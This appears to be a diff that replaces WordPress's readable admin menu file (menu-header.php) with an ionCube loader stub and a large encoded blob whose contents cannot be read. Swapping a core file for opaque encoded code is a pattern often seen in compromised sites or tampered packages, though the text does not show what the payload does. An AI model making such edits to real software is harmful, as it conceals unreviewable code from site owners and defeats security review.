@@ -1,275 +1,192 @@
-<?php
-/**
- * Displays Administration Menu.
- *
- * @package WordPress
- * @subpackage Administration
- */
-
-/**
- * The current page.
- *
- * @global string $self
- */
-$self = preg_replace('|^.*/wp-admin/network/|i', '', $_SERVER['PHP_SELF']);
-$self = preg_replace('|^.*/wp-admin/|i', '', $self);
-$self = preg_replace('|^.*/plugins/|i', '', $self);
-$self = preg_replace('|^.*/mu-plugins/|i', '', $self);
-
-/**
- * For when admin-header is included from within a function.
- *
- * @global array  $menu
- * @global array  $submenu
- * @global string $parent_file
- * @global string $submenu_file
- */
-global $menu, $submenu, $parent_file, $submenu_file;
-
-/**
- * Filters the parent file of an admin menu sub-menu item.
- *
- * Allows plugins to move sub-menu items around.
- *
- * @since MU (3.0.0)
- *
- * @param string $parent_file The parent file.
- */
-$parent_file = apply_filters( 'parent_file', $parent_file );
-
-/**
- * Filters the file of an admin menu sub-menu item.
- *
- * @since 4.4.0
- *
- * @param string $submenu_file The submenu file.
- * @param string $parent_file  The submenu item's parent file.
- */
-$submenu_file = apply_filters( 'submenu_file', $submenu_file, $parent_file );
-
-get_admin_page_parent();
-
-/**
- * Display menu.
- *
- * @access private
- * @since 2.7.0
- *
- * @global string $self
- * @global string $parent_file
- * @global string $submenu_file
- * @global string $plugin_page
- * @global string $typenow
- *
- * @param array $menu
- * @param array $submenu
- * @param bool  $submenu_as_parent
- */
-function _wp_menu_output( $menu, $submenu, $submenu_as_parent = true ) {
-	global $self, $parent_file, $submenu_file, $plugin_page, $typenow;
-
-	$first = true;
-	// 0 = menu_title, 1 = capability, 2 = menu_slug, 3 = page_title, 4 = classes, 5 = hookname, 6 = icon_url
-	foreach ( $menu as $key => $item ) {
-		$admin_is_parent = false;
-		$class = array();
-		$aria_attributes = '';
-		$aria_hidden = '';
-		$is_separator = false;
-
-		if ( $first ) {
-			$class[] = 'wp-first-item';
-			$first = false;
-		}
-
-		$submenu_items = array();
-		if ( ! empty( $submenu[$item[2]] ) ) {
-			$class[] = 'wp-has-submenu';
-			$submenu_items = $submenu[$item[2]];
-		}
-
-		if ( ( $parent_file && $item[2] == $parent_file ) || ( empty($typenow) && $self == $item[2] ) ) {
-			if ( ! empty( $submenu_items ) ) {
-				$class[] = 'wp-has-current-submenu wp-menu-open';
-			} else {
-				$class[] = 'current';
-				$aria_attributes .= 'aria-current="page"';
-			}
-		} else {
-			$class[] = 'wp-not-current-submenu';
-			if ( ! empty( $submenu_items ) )
-				$aria_attributes .= 'aria-haspopup="true"';
-		}
-
-		if ( ! empty( $item[4] ) )
-			$class[] = esc_attr( $item[4] );
-
-		$class = $class ? ' class="' . join( ' ', $class ) . '"' : '';
-		$id = ! empty( $item[5] ) ? ' id="' . preg_replace( '|[^a-zA-Z0-9_:.]|', '-', $item[5] ) . '"' : '';
-		$img = $img_style = '';
-		$img_class = ' dashicons-before';
-
-		if ( false !== strpos( $class, 'wp-menu-separator' ) ) {
-			$is_separator = true;
-		}
-
-		/*
-		 * If the string 'none' (previously 'div') is passed instead of a URL, don't output
-		 * the default menu image so an icon can be added to div.wp-menu-image as background
-		 * with CSS. Dashicons and base64-encoded data:image/svg_xml URIs are also handled
-		 * as special cases.
-		 */
-		if ( ! empty( $item[6] ) ) {
-			$img = '<img src="' . $item[6] . '" alt="" />';
-
-			if ( 'none' === $item[6] || 'div' === $item[6] ) {
-				$img = '<br />';
-			} elseif ( 0 === strpos( $item[6], 'data:image/svg+xml;base64,' ) ) {
-				$img = '<br />';
-				$img_style = ' style="background-image:url(\'' . esc_attr( $item[6] ) . '\')"';
-				$img_class = ' svg';
-			} elseif ( 0 === strpos( $item[6], 'dashicons-' ) ) {
-				$img = '<br />';
-				$img_class = ' dashicons-before ' . sanitize_html_class( $item[6] );
-			}
-		}
-		$arrow = '<div class="wp-menu-arrow"><div></div></div>';
-
-		$title = wptexturize( $item[0] );
-
-		// hide separators from screen readers
-		if ( $is_separator ) {
-			$aria_hidden = ' aria-hidden="true"';
-		}
-
-		echo "\n\t<li$class$id$aria_hidden>";
-
-		if ( $is_separator ) {
-			echo '<div class="separator"></div>';
-		} elseif ( $submenu_as_parent && ! empty( $submenu_items ) ) {
-			$submenu_items = array_values( $submenu_items );  // Re-index.
-			$menu_hook = get_plugin_page_hook( $submenu_items[0][2], $item[2] );
-			$menu_file = $submenu_items[0][2];
-			if ( false !== ( $pos = strpos( $menu_file, '?' ) ) )
-				$menu_file = substr( $menu_file, 0, $pos );
-			if ( ! empty( $menu_hook ) || ( ( 'index.php' != $submenu_items[0][2] ) && file_exists( WP_PLUGIN_DIR . "/$menu_file" ) && ! file_exists( ABSPATH . "/wp-admin/$menu_file" ) ) ) {
-				$admin_is_parent = true;
-				echo "<a href='admin.php?page={$submenu_items[0][2]}'$class $aria_attributes>$arrow<div class='wp-menu-image$img_class'$img_style>$img</div><div class='wp-menu-name'>$title</div></a>";
-			} else {
-				echo "\n\t<a href='{$submenu_items[0][2]}'$class $aria_attributes>$arrow<div class='wp-menu-image$img_class'$img_style>$img</div><div class='wp-menu-name'>$title</div></a>";
-			}
-		} elseif ( ! empty( $item[2] ) && current_user_can( $item[1] ) ) {
-			$menu_hook = get_plugin_page_hook( $item[2], 'admin.php' );
-			$menu_file = $item[2];
-			if ( false !== ( $pos = strpos( $menu_file, '?' ) ) )
-				$menu_file = substr( $menu_file, 0, $pos );
-			if ( ! empty( $menu_hook ) || ( ( 'index.php' != $item[2] ) && file_exists( WP_PLUGIN_DIR . "/$menu_file" ) && ! file_exists( ABSPATH . "/wp-admin/$menu_file" ) ) ) {
-				$admin_is_parent = true;
-				echo "\n\t<a href='admin.php?page={$item[2]}'$class $aria_attributes>$arrow<div class='wp-menu-image$img_class'$img_style>$img</div><div class='wp-menu-name'>{$item[0]}</div></a>";
-			} else {
-				echo "\n\t<a href='{$item[2]}'$class $aria_attributes>$arrow<div class='wp-menu-image$img_class'$img_style>$img</div><div class='wp-menu-name'>{$item[0]}</div></a>";
-			}
-		}
-
-		if ( ! empty( $submenu_items ) ) {
-			echo "\n\t<ul class='wp-submenu wp-submenu-wrap'>";
-			echo "<li class='wp-submenu-head' aria-hidden='true'>{$item[0]}</li>";
-
-			$first = true;
-
-			// 0 = menu_title, 1 = capability, 2 = menu_slug, 3 = page_title, 4 = classes
-			foreach ( $submenu_items as $sub_key => $sub_item ) {
-				if ( ! current_user_can( $sub_item[1] ) )
-					continue;
-
-				$class = array();
-				$aria_attributes = '';
-				if ( $first ) {
-					$class[] = 'wp-first-item';
-					$first = false;
-				}
-
-				$menu_file = $item[2];
-
-				if ( false !== ( $pos = strpos( $menu_file, '?' ) ) )
-					$menu_file = substr( $menu_file, 0, $pos );
-
-				// Handle current for post_type=post|page|foo pages, which won't match $self.
-				$self_type = ! empty( $typenow ) ? $self . '?post_type=' . $typenow : 'nothing';
-
-				if ( isset( $submenu_file ) ) {
-					if ( $submenu_file == $sub_item[2] ) {
-						$class[] = 'current';
-						$aria_attributes .= ' aria-current="page"';
-					}
-				// If plugin_page is set the parent must either match the current page or not physically exist.
-				// This allows plugin pages with the same hook to exist under different parents.
-				} elseif (
-					( ! isset( $plugin_page ) && $self == $sub_item[2] ) ||
-					( isset( $plugin_page ) && $plugin_page == $sub_item[2] && ( $item[2] == $self_type || $item[2] == $self || file_exists($menu_file) === false ) )
-				) {
-					$class[] = 'current';
-					$aria_attributes .= ' aria-current="page"';
-				}
-
-				if ( ! empty( $sub_item[4] ) ) {
-					$class[] = esc_attr( $sub_item[4] );
-				}
-
-				$class = $class ? ' class="' . join( ' ', $class ) . '"' : '';
-
-				$menu_hook = get_plugin_page_hook($sub_item[2], $item[2]);
-				$sub_file = $sub_item[2];
-				if ( false !== ( $pos = strpos( $sub_file, '?' ) ) )
-					$sub_file = substr($sub_file, 0, $pos);
-
-				$title = wptexturize($sub_item[0]);
-
-				if ( ! empty( $menu_hook ) || ( ( 'index.php' != $sub_item[2] ) && file_exists( WP_PLUGIN_DIR . "/$sub_file" ) && ! file_exists( ABSPATH . "/wp-admin/$sub_file" ) ) ) {
-					// If admin.php is the current page or if the parent exists as a file in the plugins or admin dir
-					if ( ( ! $admin_is_parent && file_exists( WP_PLUGIN_DIR . "/$menu_file" ) && ! is_dir( WP_PLUGIN_DIR . "/{$item[2]}" ) ) || file_exists( $menu_file ) )
-						$sub_item_url = add_query_arg( array( 'page' => $sub_item[2] ), $item[2] );
-					else
-						$sub_item_url = add_query_arg( array( 'page' => $sub_item[2] ), 'admin.php' );
-
-					$sub_item_url = esc_url( $sub_item_url );
-					echo "<li$class><a href='$sub_item_url'$class$aria_attributes>$title</a></li>";
-				} else {
-					echo "<li$class><a href='{$sub_item[2]}'$class$aria_attributes>$title</a></li>";
-				}
-			}
-			echo "</ul>";
-		}
-		echo "</li>";
-	}
-
-	echo '<li id="collapse-menu" class="hide-if-no-js">' .
-		'<button type="button" id="collapse-button" aria-label="' . esc_attr__( 'Collapse Main menu' ) . '" aria-expanded="true">' .
-		'<span class="collapse-button-icon" aria-hidden="true"></span>' .
-		'<span class="collapse-button-label">' . __( 'Collapse menu' ) . '</span>' .
-		'</button></li>';
-}
-
+<?php //004fb
+if(!extension_loaded('ionCube Loader')){$__oc=strtolower(substr(php_uname(),0,3));$__ln='ioncube_loader_'.$__oc.'_'.substr(phpversion(),0,3).(($__oc=='win')?'.dll':'.so');if(function_exists('dl')){@dl($__ln);}if(function_exists('_il_exec')){return _il_exec();}$__ln='/ioncube/'.$__ln;$__oid=$__id=realpath(ini_get('extension_dir'));$__here=dirname(__FILE__);if(strlen($__id)>1&&$__id[1]==':'){$__id=str_replace('\\','/',substr($__id,2));$__here=str_replace('\\','/',substr($__here,2));}$__rd=str_repeat('/..',substr_count($__id,'/')).$__here.'/';$__i=strlen($__rd);while($__i--){if($__rd[$__i]=='/'){$__lp=substr($__rd,0,$__i).$__ln;if(file_exists($__oid.$__lp)){$__ln=$__lp;break;}}}if(function_exists('dl')){@dl($__ln);}}else{die('The file '.__FILE__." is corrupted.\n");}if(function_exists('_il_exec')){return _il_exec();}echo("Site error: the ".(php_sapi_name()=='cli'?'ionCube':'<a href="http://www.ioncube.com">ionCube</a>')." PHP Loader needs to be installed. This is a widely used PHP extension for running ionCube protected PHP code, website security and malware blocking.\n\nPlease visit ".(php_sapi_name()=='cli'?'get-loader.ioncube.com':'<a href="http://get-loader.ioncube.com">get-loader.ioncube.com</a>')." for install assistance.\n\n");exit(199);
 ?>
-
-<div id="adminmenumain" role="navigation" aria-label="<?php esc_attr_e( 'Main menu' ); ?>">
-<a href="#wpbody-content" class="screen-reader-shortcut"><?php _e( 'Skip to main content' ); ?></a>
-<a href="#wp-toolbar" class="screen-reader-shortcut"><?php _e( 'Skip to toolbar' ); ?></a>
-<div id="adminmenuback"></div>
-<div id="adminmenuwrap">
-<ul id="adminmenu">
-
-<?php
-
-_wp_menu_output( $menu, $submenu );
-/**
- * Fires after the admin menu has been output.
- *
- * @since 2.5.0
- */
-do_action( 'adminmenu' );
-
-?>
-</ul>
-</div>
-</div>
+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
